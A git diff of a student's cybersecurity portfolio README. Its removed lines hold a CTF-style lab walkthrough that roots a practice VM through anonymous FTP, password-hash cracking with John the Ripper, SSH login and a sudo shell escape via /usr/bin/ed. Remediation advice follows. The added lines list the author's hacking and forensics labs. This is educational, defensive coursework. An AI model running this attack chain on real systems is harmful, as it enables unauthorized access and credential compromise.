@@ -1,259 +1,79 @@
-# VM Project: Privilege Escalation to Root — CTF-Style Lab
+# Cybersecurity Portfolio — Karnelius Sindhu
 
-**Tools:** Kali Linux, Nmap, FTP, John the Ripper, SSH, sudo  
-**Target:** `192.168.23.4`  
-**Attacker:** `192.168.23.2` (Kali Linux)  
-**Objective:** Gain root access and retrieve `flag.txt`
+A collection of hands-on labs and projects completed in ethical hacking and digital forensics coursework. Each lab documents real attack techniques, forensic analysis methods, and security findings using industry-standard tools.
 
 ---
 
-## Attack Chain Overview
+## Repository Structure
 
 ```
-Network Scan → FTP Anonymous Login → Backup File Download
-→ Hash Extraction → Password Cracking → SSH Login
-→ sudo Enumeration → Privilege Escalation → Root Shell → flag.txt
-```
-
----
-
-## Step 1: Identify Attacker Machine IP
-
-```bash
-ifconfig
-```
-
-**Result:** Kali machine on `192.168.23.2` (eth0), confirming same subnet as target.
-
-![ifconfig output showing Kali IP 192.168.23.2](screenshots/image1.jpeg)
-
----
-
-## Step 2: Discover Target on the Network
-
-Performed a host discovery scan to find live machines on the subnet.
-
-**Result:** Target discovered at `192.168.23.4`
-
-![Netdiscover output showing target at 192.168.23.4](screenshots/image2.jpeg)
-
----
-
-## Step 3: Port Scan the Target
-
-```bash
-nmap -sC -sV -T4 192.168.23.4
-```
-
-| Flag | Purpose |
-|------|---------|
-| `-sC` | Run default Nmap scripts |
-| `-sV` | Detect service versions |
-| `-T4` | Increase scan speed |
-
-**Results:**
-
-| Port | State | Service |
-|------|-------|---------|
-| 21/tcp | Open | FTP |
-| 22/tcp | Open | SSH |
-
-**Critical Finding:** `Anonymous FTP login allowed` — unauthenticated file access is possible.
-
-![Nmap scan showing FTP port 21 open with anonymous login and SSH port 22](screenshots/image3.jpeg)
-
----
-
-## Step 4: Inspect Exposed FTP File (Pre-Login Recon)
-
-```bash
-file backup
-cat backup
-```
-
-The `backup` file was an ASCII text file containing a `CREDENTIALS:` section with usernames and password hashes:
-
-| Username |
-|----------|
-| office |
-| datacenter |
-| sky |
-| sunset |
-| space |
-
----
-
-## Step 5: Download Backup File via Anonymous FTP
-
-```bash
-ftp 192.168.23.4
-# Login: anonymous
-ls -la
-get backup
-```
-
-File successfully transferred to Kali for offline analysis.
-
----
-
-## Step 6 & 7: Prepare Hashes for Cracking
-
-```bash
-nano hashes.txt   # Opened file in text editor
-cat hashes.txt    # Verified contents
-```
-
-Credential lines copied into `hashes.txt` — the required input format for John the Ripper.
-
----
-
-## Step 8 & 9: Crack Passwords with John the Ripper
-
-Initial run:
-
-```bash
-john --show hashes.txt
-# Result: 0 password hashes cracked, 4 left
-```
-
-John detected ambiguous hash formats (HMAC-SHA256 vs sha512crypt). Format needed to be specified explicitly.
-
----
-
-## Step 10: Force Correct Hash Format
-
-```bash
-john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-```
-
-**Cracked passwords:**
-
-| Username | Password |
-|----------|----------|
-| space | space |
-| sunset | cheer14 |
-
----
-
-## Step 11: SSH Login with Cracked Credentials
-
-```bash
-ssh space@192.168.23.4
-# Result: Permission denied
-```
-
-```bash
-ssh sunset@192.168.23.4
-# Password: cheer14
-# Result: Login successful
-```
-
-Remote shell access achieved as user `sunset`.
-
----
-
-## Step 12: Privilege Escalation
-
-### Check sudo permissions
-
-```bash
-sudo -l
-```
-
-**Output:**
-
-```
-(root) NOPASSWD: /usr/bin/ed
-```
-
-The `sunset` user can run `/usr/bin/ed` as root without a password — a privilege escalation misconfiguration.
-
-### Exploit sudo via ed
-
-```bash
-sudo /usr/bin/ed
-# From within ed, escape to shell
-```
-
-### Verify root access
-
-```bash
-whoami
-# root
-
-id
-# uid=0(root) gid=0(root)
+cybersecurity-portfolio/
+├── ethical-hacking/
+│   ├── lab-10-metasploitable/
+│   ├── lab-13-metasploit-framework/
+│   ├── lab-21-dvwa-vulnerabilities/
+│   ├── lab-23-wireless-exploitation/
+│   ├── lab-network-analysis/
+│   └── vm-project-privilege-escalation/
+└── digital-forensics/
+    ├── lab-3-m57-jean/
+    ├── lab-4-registry-viewer/
+    ├── lab-5-unix-forensics/
+    └── lab-clampet-ftk/
 ```
 
 ---
 
-## Step 13: Retrieve the Flag
+## Ethical Hacking Labs
 
-```bash
-cd /root
-ls
-# flag.txt  ftp  server.sh
+| Lab | Topic | Key Tools |
+|-----|-------|-----------|
+| [Lab 10](./ethical-hacking/lab-10-metasploitable/) | Metasploitable2 Enumeration & Password Cracking | Nmap, Nbtstat, John the Ripper |
+| [Lab 13](./ethical-hacking/lab-13-metasploit-framework/) | Exploiting Samba via Metasploit Framework | Metasploit, Nmap, CVE-2007-2447 |
+| [Lab 21](./ethical-hacking/lab-21-dvwa-vulnerabilities/) | DVWA Web Vulnerabilities | Burp Suite, DVWA, Manual Injection |
+| [Lab 23](./ethical-hacking/lab-23-wireless-exploitation/) | Wireless Access Exploitation | Wireshark, Aircrack-ng |
+| [Lab 15](./ethical-hacking/lab-network-analysis/) | Network Traffic Analysis | Wireshark, WebSocket Filters |
+| [VM Project](./ethical-hacking/vm-project-privilege-escalation/) | Privilege Escalation to Root | FTP, John the Ripper, SSH, sudo |
 
-more flag.txt
-```
+## Digital Forensics Labs
 
-**Flag retrieved — full system compromise confirmed.**
-
----
-
-## Vulnerabilities Identified
-
-| Vulnerability | Risk |
-|---------------|------|
-| Anonymous FTP access enabled | High |
-| Sensitive backup file exposed over FTP | Critical |
-| Weak user passwords | High |
-| Password hashes stored in downloadable file | Critical |
-| Improper sudo config (`/usr/bin/ed` as root NOPASSWD) | Critical |
-| SSH enabled for weak-password accounts | High |
+| Lab | Topic | Key Tools |
+|-----|-------|-----------|
+| [Lab 3](./digital-forensics/lab-3-m57-jean/) | M57 Jean — Email & Insider Threat Investigation | FTK Imager, Kernel PST Viewer |
+| [Lab 4](./digital-forensics/lab-4-registry-viewer/) | Windows Registry Forensics — Washer Image | FTK Imager, AccessData Registry Viewer |
+| [Lab 5](./digital-forensics/lab-5-unix-forensics/) | Unix/Linux Disk Image Forensics | FTK Imager, JSON Editor |
+| [Clampet](./digital-forensics/lab-clampet-ftk/) | FTK Full Case Investigation — Clampet Image | FTK, AccessData Registry Viewer |
 
 ---
 
-## Recommendations
+## Skills Demonstrated
 
-### 1. Disable Anonymous FTP
-
-```
-# In vsftpd.conf:
-anonymous_enable=NO
-```
-
-Consider replacing FTP with **SFTP or FTPS** (encrypted alternatives).
-
-### 2. Enforce Strong Password Policy
-
-- Minimum 12 characters
-- Uppercase + lowercase + numbers + special characters
-- Enforce with `pam_pwquality` or `pam_cracklib`
-
-### 3. Harden SSH
-
-```
-# In /etc/ssh/sshd_config:
-PasswordAuthentication no
-PermitRootLogin no
-```
-
-Use SSH key-based authentication only.
-
-### 4. Fix sudo Configuration
-
-Remove or restrict NOPASSWD entries for editors and other shell-escape-capable binaries. Reference: [GTFOBins](https://gtfobins.github.io/) for a list of exploitable binaries.
-
-### 5. Regular Security Audits
-
-- Vulnerability scanning: Nessus, OpenVAS
-- Log monitoring: Fail2Ban
-- File permission reviews
-- Password auditing
+- Network scanning and enumeration (Nmap, Netdiscover, Nbtstat)
+- Exploitation with Metasploit Framework (CVE-2007-2447 Samba)
+- Web application attacks: SQLi, XSS, CSRF, Command Injection (DVWA)
+- Wireless network analysis and WPA password cracking (Aircrack-ng)
+- Offline password cracking (John the Ripper, rockyou.txt)
+- Privilege escalation via misconfigured sudo
+- Windows Registry forensics (SAM, SYSTEM, NTUSER.DAT, SOFTWARE)
+- Email and browser artifact recovery (PST files, TypedURLs, RecentDocs)
+- USB device history analysis (USBSTOR hive)
+- Unix inode analysis and file system forensics (EXT3)
+- Packet capture analysis (Wireshark, WebSocket, 802.11)
+- Forensic case management (FTK case creation, hashing, filtering, reporting)
 
 ---
 
-## Conclusion
+## Tools & Environment
 
-This lab demonstrated a complete attack chain from unauthenticated file access to root shell access. The compromise was possible due to chained misconfigurations — anonymous FTP, insecure credential storage, weak passwords, and an improper sudo rule — each individually manageable but collectively providing full system access.
+| Category | Tools |
+|----------|-------|
+| Attacker OS | Kali Linux |
+| Target Machines | Metasploitable2, Custom VMs (VMware) |
+| Forensic Platform | AccessData FTK, FTK Imager, Registry Viewer |
+| Network Analysis | Wireshark, Nmap, Netdiscover |
+| Exploitation | Metasploit Framework, Burp Suite, Aircrack-ng |
+| Password Cracking | John the Ripper, rockyou.txt |
+
+---
+
+> **Disclaimer:** All work was performed in isolated lab environments for educational purposes only. No unauthorized systems were accessed.
